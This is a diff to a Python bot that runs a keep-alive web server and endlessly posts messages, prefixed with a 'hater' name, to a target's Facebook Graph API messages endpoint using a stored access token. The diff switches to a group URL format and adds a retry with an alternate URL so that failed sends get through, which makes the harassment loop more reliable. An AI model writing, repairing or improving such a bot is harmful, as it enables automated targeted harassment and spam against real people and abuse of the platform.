@@ -18,7 +18,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"SERVER IS RUNNING")
+        self.wfile.write(b"ONLINE")
 
 def run_server():
     PORT = int(os.environ.get('PORT', 10000))
@@ -26,7 +26,7 @@ def run_server():
         httpd.serve_forever()
 
 def send_messages():
-    print(">> STARTING BOT PROCESS <<", flush=True)
+    print(">> STARTING <<", flush=True)
     try:
         with open('time.txt', 'r') as f: delay = int(f.read().strip())
         with open('haternames.txt', 'r') as f: hater = f.read().strip()
@@ -37,17 +37,24 @@ def send_messages():
 
         while True:
             for i, msg in enumerate(messages):
-                url = f"https://graph.facebook.com/v15.0/{TARGET_ID}/messages"
+                # Corrected URL format for Groups
+                url = f"https://graph.facebook.com/v15.0/m_{TARGET_ID}/messages"
                 payload = {'message': f"{hater} {msg}", 'access_token': TOKEN}
                 response = requests.post(url, data=payload, headers=headers)
                 t = time.strftime("%I:%M:%S %p")
                 if response.status_code == 200:
                     print(f"[{t}] SENT: {i+1}", flush=True)
                 else:
-                    print(f"[{t}] FAILED: {response.text}", flush=True)
+                    # Retry with alternate format if first fails
+                    url_alt = f"https://graph.facebook.com/v15.0/{TARGET_ID}/messages"
+                    response = requests.post(url_alt, data=payload, headers=headers)
+                    if response.status_code == 200:
+                        print(f"[{t}] SENT: {i+1}", flush=True)
+                    else:
+                        print(f"[{t}] FAILED: {response.text}", flush=True)
                 time.sleep(delay)
     except Exception as e:
-        print(f"FATAL ERROR: {e}", flush=True)
+        print(f"ERROR: {e}", flush=True)
 
 if __name__ == "__main__":
     threading.Thread(target=run_server, daemon=True).start()
